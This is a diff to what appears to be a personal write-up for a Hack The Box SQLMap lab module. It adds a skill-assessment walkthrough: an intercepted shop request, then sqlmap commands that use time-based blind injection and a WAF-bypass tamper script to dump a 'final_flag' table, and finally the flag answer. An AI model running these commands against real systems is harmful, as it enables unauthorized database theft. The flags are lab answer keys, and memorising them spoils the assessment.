@@ -12,6 +12,7 @@
 4. [Advanced SQLMap Usage](#advanced-sqlmap-usage)
     1. [Bypassing Web Application Protections](#bypassing-web-application-protections)
     2. [OS Exploitation](#os-exploitation)
+5. [Skill Assesment](#skill-assesment)
 
 ## Getting Started
 ### SQLMap Overview
@@ -449,3 +450,51 @@
     sqlmap -r req.txt --os-shell --technique=E
     ```
     The answer is `HTB{n3v3r_run_db_45_db4}`.
+
+## Skill Assesment
+1. What's the contents of table final_flag?
+
+    After doing exploration, i found out that "add to chart" action is vuln. Here the intercepted request:
+
+    ```txt
+    POST /action.php HTTP/1.1
+    Host: 94.237.120.74:30168
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.120.74:30168/shop.html
+    Content-Type: application/json
+    Content-Length: 8
+    Origin: http://94.237.120.74:30168
+    DNT: 1
+    Connection: keep-alive
+    Sec-GPC: 1
+    Priority: u=0
+
+    {"id":1}
+    ```
+    I tried to modify to add "\*" so it looks like this,{"id":1*}. Then i tried to enumerate the database.
+
+    ```bash
+    sqlmap -r req.txt --banner --current-user --current-db --is-dba --no-cast --dump --batch
+    ```
+    ![alt text](<Assets/Skill Assesment - 1.png>)
+
+    Based on that, the type of it is time-based blind (--technique=T). Not only that, i also found this warning.
+
+    ![alt text](<Assets/Skill Assesment - 2.png>)
+
+    Based on those information, i rerun the command.
+
+    ```bash
+    sqlmap -r req.txt --dump --batch --technique=T --tamper=between --no-cast --flush-session
+    ```
+    ![alt text](<Assets/Skill Assesment - 3.png>)
+
+    We can see that it has interesting table name (final_flag table in the production database). Then, i tried to retrive the data from it.
+
+    ```bash
+    sqlmap -r req.txt -T final_flag -D production --dump --batch --no-cast --technique=T --tamper=between
+    ```
+    The answer is `HTB{n07_50_h4rd_r16h7?!}`.
